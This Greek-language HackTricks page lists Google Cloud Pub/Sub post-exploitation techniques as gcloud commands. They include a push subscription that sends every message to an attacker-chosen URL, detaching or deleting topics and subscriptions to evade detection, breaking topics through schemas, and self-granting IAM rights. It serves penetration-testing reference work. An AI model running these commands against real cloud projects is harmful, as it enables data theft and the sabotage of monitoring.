# GCP - Μετά την Εκμετάλλευση του Pub/Sub

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στην** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

## Pub/Sub

Για περισσότερες πληροφορίες σχετικά με το Pub/Sub, ελέγξτε την ακόλουθη σελίδα:

{% content-ref url="../gcp-services/gcp-pub-sub.md" %}
[gcp-pub-sub.md](../gcp-services/gcp-pub-sub.md)
{% endcontent-ref %}

### `pubsub.topics.publish`

Δημοσιεύστε ένα μήνυμα σε ένα θέμα, χρήσιμο για να **στείλετε απρόσμενα δεδομένα** και να ενεργοποιήσετε απρόσμενες λειτουργίες ή να εκμεταλλευτείτε ευπάθειες:
```bash
# Publish a message in a topic
gcloud pubsub topics publish <topic_name> --message "Hello!"
```
### `pubsub.topics.detachSubscription`

Χρήσιμο για να αποτρέψετε μια συνδρομή από το να λαμβάνει μηνύματα, ίσως για να αποφύγετε την ανίχνευση.
```bash
gcloud pubsub topics detach-subscription <FULL SUBSCRIPTION NAME>
```
### `pubsub.topics.delete`

Χρήσιμο για να αποτρέψετε μια συνδρομή από το να λαμβάνει μηνύματα, ίσως για να αποφύγετε την ανίχνευση.\
Είναι δυνατόν να διαγράψετε ένα θέμα ακόμα και με συνδρομές που είναι συνδεδεμένες σε αυτό.
```bash
gcloud pubsub topics delete <TOPIC NAME>
```
### `pubsub.topics.update`

Χρησιμοποιήστε αυτήν την άδεια για να ενημερώσετε κάποια ρύθμιση του θέματος για να το διαταράξετε, όπως `--clear-schema-settings`, `--message-retention-duration`, `--message-storage-policy-allowed-regions`, `--schema`, `--schema-project`, `--topic-encryption-key`...

### `pubsub.topics.setIamPolicy`

Δώστε στον εαυτό σας την άδεια να εκτελέσετε οποιαδήποτε από τις προηγούμενες επιθέσεις.

### **`pubsub.subscriptions.create,`**`pubsub.topics.attachSubscription` , (`pubsub.subscriptions.consume`)

Λάβετε όλα τα μηνύματα σε έναν διακομιστή ιστού:

{% code overflow="wrap" %}
```bash
# Crete push subscription and recieve all the messages instantly in your web server
gcloud pubsub subscriptions create <subscription name> --topic <topic name> --push-endpoint https://<URL to push to>
```
{% endcode %}

Δημιουργήστε μια συνδρομή και χρησιμοποιήστε τη για να **ανακτήσετε μηνύματα** (pull messages):
```bash
# This will retrive a non ACKed message (and won't ACK it)
gcloud pubsub subscriptions create <subscription name> --topic <topic_name>

# You also need pubsub.subscriptions.consume for this
gcloud pubsub subscriptions pull <FULL SUBSCRIPTION NAME>
## This command will wait for a message to be posted
```
### `pubsub.subscriptions.delete`

Η διαγραφή μιας συνδρομής μπορεί να είναι χρήσιμη για να διαταράξετε ένα σύστημα επεξεργασίας καταγραφών ή κάτι παρόμοιο:
```bash
gcloud pubsub subscriptions delete <FULL SUBSCRIPTION NAME>
```
### &#x20;`pubsub.subscriptions.update`

Χρησιμοποιήστε αυτήν την άδεια για να ενημερώσετε κάποια ρύθμιση ώστε τα μηνύματα να αποθηκεύονται σε ένα μέρος που μπορείτε να έχετε πρόσβαση (URL, πίνακας Big Query, Bucket) ή απλά για να το διαταράξετε.

### `pubsub.subscriptions.setIamPolicy`

Δώστε στον εαυτό σας τις απαραίτητες άδειες για να εκτελέσετε οποιαδήποτε από τις προηγούμενες σχολιασμένες επιθέσεις.

### `pubsub.schemas.delete`

Διαγράψτε ένα σχήμα για να μπορείτε να στείλετε μηνύματα που δεν πληρούν το σχήμα:
```bash
gcloud pubsub schemas delete <SCHEMA NAME>
```
### `pubsub.schemas.attach`, `pubsub.topics.update`,(`pubsub.schemas.create`)

Επιτεθείτε σε ένα σχήμα σε ένα θέμα, έτσι ώστε τα μηνύματα να μην το πληρούν και, συνεπώς, το θέμα να διαταραχθεί.\
Εάν δεν υπάρχουν καθόλου σχήματα, μπορεί να χρειαστεί να δημιουργήσετε ένα. 

{% code title="schema.json" %}
```json
{
"namespace": "com.example",
"type": "record",
"name": "Person",
"fields": [
{
"name": "name",
"type": "string"
},
{
"name": "age",
"type": "int"
}
]
}
```
{% endcode %}
```bash
# Attach new schema
gcloud pubsub topics update projects/<project-name>/topics/<topic-id> \
--schema=projects/<project-name>/schemas/<topic-id> \
--message-encoding=json
```
### `pubsub.schemas.setIamPolicy`

Δώστε στον εαυτό σας τις απαραίτητες άδειες για να εκτελέσετε οποιαδήποτε από τις προηγούμενες σχολιασμένες επιθέσεις.

### `pubsub.snapshots.create`,  `pubsub.snapshots.seek`

Αυτό θα δημιουργήσει ένα αντίγραφο όλων των μη αναγνωρισμένων μηνυμάτων και θα τα επανατοποθετήσει στην συνδρομή. Δεν είναι πολύ χρήσιμο για έναν επιτιθέμενο, αλλά εδώ είναι:
```bash
gcloud pubsub snapshots create YOUR_SNAPSHOT_NAME \
--subscription=YOUR_SUBSCRIPTION_NAME
gcloud pubsub subscriptions seek YOUR_SUBSCRIPTION_NAME \
--snapshot=YOUR_SNAPSHOT_NAME
```
<details>

<summary><strong>Μάθετε το hacking του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**The PEASS Family**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα hacking tricks σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>
